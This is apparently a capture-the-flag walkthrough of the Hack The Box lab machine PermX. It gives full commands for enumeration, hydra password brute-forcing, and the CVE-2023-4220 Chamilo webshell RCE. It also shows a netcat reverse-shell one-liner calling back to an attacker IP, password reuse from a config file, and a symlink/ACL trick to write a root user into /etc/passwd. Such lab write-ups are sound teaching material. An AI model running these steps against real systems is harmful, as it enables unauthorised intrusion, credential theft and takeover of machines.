# PermX - Easy

```sh
sudo vim /etc/hosts
# map target IP to permx.htb

nmap -T4 -p- -A -Pn -v permx.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
    * 80/tcp - http - Apache httpd 2.4.52

* the webpage is a eLearning website; the footer includes an email address 'permx@htb.com'

* checking the source code for the webpage and its subpages does not show anything interesting

* in the /team.html subpage, we get a few names - Noah, Elsie, Ralph & Mia - this may be useful later

* web enumeration:

    ```sh
    gobuster dir -u http://permx.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # basic dir scan

    ffuf -c -u "http://permx.htb" -H "Host: FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 18 -s
    # subdomain scan, filtering false positives
    ```

* the subdomain scan reveals a subdomain 'lms.permx.htb' - add this to ```/etc/hosts```

* this subdomain leads to a login page for Chamilo, a e-learning & collaboration software

* the webpage footer includes the email 'admin@permx.htb' and mentions the name 'David Miller' as Administrator

* there is also an option for 'I lost my password' at '/main/auth/lostPassword.php' - but trying this option does not work, and the webpage says to contact David Miller

* attempting default and weak creds like 'admin:admin', 'admin:password' and 'admin:DigitalOcean' does not work

* we can attempt bruteforcing login as 'admin' using ```hydra```:

    ```sh
    # use Developer Tools > Network, or Burp Suite, to get the POST request format

    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f lms.permx.htb http-post-form "/index.php:login=^USER^&password=^PASS^&submitAuth=&_qf__formLogin=:F=Login failed - incorrect login or password."
    ```

* simultaneously, we can do a directory scan on this subdomain:

    ```sh
    gobuster dir -u http://lms.permx.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    ```

* interesting pages found:

    * /app - website source code files, includes subfolders
    * /documentation - the changelog page reveals the version Chamilo 1.11.24
    * /web.config - XML file on webpage components

* Googling for exploits associated with Chamilo 1.11.24 leads to [CVE-2023-4220](https://www.exploit-db.com/exploits/52083) - an unauthenticated RCE vuln - so we can attempt this exploit:

    ```sh
    python3 CVE-2023-4220.py --shell simple-webshell.php http://lms.permx.htb/ id
    # this works and we have RCE via uploaded webshell

    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/simple-webshell.php?cmd=id'
    # www-data

    # setup listener
    nc -nvlp 4444

    # use reverse-shell URL-encoded one-liner
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/simple-webshell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.21%204444%20%3E%2Ftmp%2Ff'
    # this gives us reverse shell
    ```

* in reverse shell:

    ```sh
    # upgrade to stable shell

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to background shell
    stty raw -echo; fg
    # press Enter twice

    whoami
    # www-data

    ls -la /var/www
    # we have two web folders

    ls -la /var/www/html
    # nothing interesting

    ls -la /var/www/chamilo
    # enumerate subfolders for any secrets

    # checking one of the config files
    cat /var/www/chamilo/app/config/configuration.php
    # this gives us a cleartext DB password

    ls -la /home
    # we have only one user 'mtz'

    ls -la /home/mtz
    # access denied
    ```

* from one of the config files, we get the creds 'chamilo:03F6lY3uXAP2bkW8' - we can try reusing this password for SSH login:

    ```sh
    ssh mtz@permx.htb
    # this password works

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that ```mtz``` can run the following as root:

    ```sh
    (ALL : ALL) NOPASSWD: /opt/acl.sh
    ```

* checking the script at ```/opt/acl.sh``` - we have read rights but cannot write to this:

    ```sh
    #!/bin/bash

    if [ "$#" -ne 3 ]; then
        /usr/bin/echo "Usage: $0 user perm file"
        exit 1
    fi

    user="$1"
    perm="$2"
    target="$3"

    if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
        /usr/bin/echo "Access denied."
        exit 1
    fi

    # Check if the path is a file
    if [ ! -f "$target" ]; then
        /usr/bin/echo "Target must be a file."
        exit 1
    fi

    /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
    ```

    * the script takes 3 args - user to grant ACL permissions to, permissions & target file

    * if the target file is not in 'mtz' home directory, or if path includes '..', then the script exits

    * the target file's ACL entry is modified using ```sudo setfacl```

* as the script does not check for symbolic links, we can create a symbolic link to ```/etc/passwd``` for a file in the home directory, and then try to assign write permissions for 'mtz':

    ```sh
    ls -la /etc/passwd
    # we do not have write permissions to this

    ln -s /etc/passwd passwd
    # create a symbolic link for /etc/passwd

    # now run the acl.sh script as sudo
    sudo /opt/acl.sh mtz rw /home/mtz/passwd
    # if we pass target as 'passwd' instead of complete path, it fails
    # this works

    ls -la /etc/passwd
    # we have write permissions now

    openssl passwd password123
    # generate hash for this password

    echo 'root2:$1$maXNVIBd$/aYZa65P5Le82ofoQEcVp1:0:0:root:/root:/bin/bash' >> /etc/passwd
    # add new user with this hash and root privileges to /etc/passwd

    su root2
    # use 'password123' and login to get root shell

    cat /root/root.txt
    # root flag

    # if we do not complete these steps quickly, the passwd file gets reset
    # as an alternative we can abuse /etc/shadow and crack hashes for root user
    ```
